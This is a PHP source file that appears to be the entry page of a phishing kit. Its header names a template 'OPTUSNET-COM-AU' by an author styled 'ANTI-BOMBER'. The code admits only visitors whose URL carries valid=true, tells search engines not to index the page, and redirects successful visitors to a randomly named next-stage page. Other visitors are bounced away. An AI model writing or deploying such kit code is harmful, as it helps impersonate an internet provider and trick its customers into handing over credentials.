<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
	$page = 'index';
	/* Require Files */
    require_once './init.php';
    /* Chak If User Coming From Valid URL */
    if($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['valid']) && $_GET['valid'] === 'true'): 
?>
<!doctype html>
<html class="no-js" lang="">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<title>Willkommen,</title>
		<meta name="robots" content="noindex, nofollow, noimageindex">
		<meta name="description" content="">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="<?php echo $css1; ?>">
		<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
		<script src="<?php echo $js;?>"></script>
	</head>
	<body>
		<?php die(rediret('./11644210b.php?web=succes&local=_&'.$id)); // We're done here ?>
	</body>
</html>
<?php 
	else:
		die(rediret($index)); // We're done here
    endif;
    ob_end_flush();
?>